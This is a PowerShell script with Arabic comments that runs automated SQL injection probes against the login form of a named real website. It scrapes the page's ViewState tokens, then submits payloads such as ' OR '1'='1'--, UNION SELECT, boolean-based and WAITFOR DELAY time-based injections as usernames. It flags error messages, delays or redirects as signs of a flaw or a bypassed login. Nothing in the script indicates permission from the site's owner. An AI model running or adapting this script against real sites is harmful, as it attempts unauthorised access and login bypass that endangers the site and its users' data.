# اختبار SQL Injection للموقع
$url = "https://www.kma-academy.com/frmLogIn.aspx?exit=ok"

# الحصول على ViewState من الصفحة
Write-Host "جاري جلب صفحة تسجيل الدخول..." -ForegroundColor Cyan
$response = Invoke-WebRequest -Uri $url -UseBasicParsing
$content = $response.Content

# استخراج ViewState و ViewStateGenerator
$viewStateMatch = [regex]::Match($content, 'id="__VIEWSTATE" value="([^"]+)"')
$viewState = if ($viewStateMatch.Success) { $viewStateMatch.Groups[1].Value } else { "" }

$viewStateGenMatch = [regex]::Match($content, 'id="__VIEWSTATEGENERATOR" value="([^"]+)"')
$viewStateGen = if ($viewStateGenMatch.Success) { $viewStateGenMatch.Groups[1].Value } else { "0C51E059" }

$eventValidationMatch = [regex]::Match($content, 'id="__EVENTVALIDATION" value="([^"]+)"')
$eventValidation = if ($eventValidationMatch.Success) { $eventValidationMatch.Groups[1].Value } else { "" }

Write-Host "`nViewState: $($viewState.Substring(0, [Math]::Min(50, $viewState.Length)))..." -ForegroundColor Yellow

# اختبارات SQL Injection
$tests = @(
    @{name="Test 1: Single Quote"; username="admin'"; password="test"},
    @{name="Test 2: OR 1=1"; username="admin' OR '1'='1"; password="test"},
    @{name="Test 3: OR 1=1--"; username="admin' OR '1'='1'--"; password="test"},
    @{name="Test 4: UNION SELECT"; username="admin' UNION SELECT NULL--"; password="test"},
    @{name="Test 5: Time-based"; username="admin'; WAITFOR DELAY '00:00:05'--"; password="test"},
    @{name="Test 6: Boolean-based"; username="admin' AND 1=1--"; password="test"}
)

Write-Host "`nبدء اختبارات SQL Injection..." -ForegroundColor Green

foreach ($test in $tests) {
    Write-Host "`n[$($test.name)]" -ForegroundColor Magenta
    
    $body = @{
        __VIEWSTATE = $viewState
        __VIEWSTATEGENERATOR = $viewStateGen
        __EVENTVALIDATION = $eventValidation
        txt_UserName = $test.username
        txt_Password = $test.password
        Btn_logIn = "دخول"
    }
    
    try {
        $startTime = Get-Date
        $testResponse = Invoke-WebRequest -Uri $url -Method POST -Body $body -UseBasicParsing -ErrorAction SilentlyContinue
        $endTime = Get-Date
        $duration = ($endTime - $startTime).TotalSeconds
        
        Write-Host "  Status: $($testResponse.StatusCode)" -ForegroundColor White
        Write-Host "  Response Time: $([math]::Round($duration, 2))s" -ForegroundColor White
        
        # البحث عن مؤشرات على وجود ثغرة
        if ($testResponse.Content -match "خطأ|error|exception|syntax|sql|database|query" -or 
            $testResponse.Content -match "الاسم أو كلمة المرور غير صحيحة" -and $duration -gt 4) {
            Write-Host "  ⚠️  قد تكون هناك ثغرة محتملة!" -ForegroundColor Red
            Write-Host "  Content Length: $($testResponse.Content.Length)" -ForegroundColor White
        } elseif ($testResponse.StatusCode -eq 302 -or $testResponse.Headers.Location) {
            Write-Host "  ⚠️  تم إعادة التوجيه - قد يكون تسجيل دخول ناجح!" -ForegroundColor Red
            Write-Host "  Location: $($testResponse.Headers.Location)" -ForegroundColor White
        } else {
            Write-Host "  ✓ يبدو آمناً (استجابة طبيعية)" -ForegroundColor Green
        }
    }
    catch {
        $statusCode = $_.Exception.Response.StatusCode.value__
        Write-Host "  Status: $statusCode" -ForegroundColor Yellow
        Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Yellow
        
        if ($statusCode -eq 500) {
            Write-Host "  ⚠️  خطأ 500 - قد يدل على معالجة خاطئة للاستعلام!" -ForegroundColor Red
        }
    }
    
    Start-Sleep -Milliseconds 500
}

Write-Host "`nاكتملت الاختبارات" -ForegroundColor Cyan
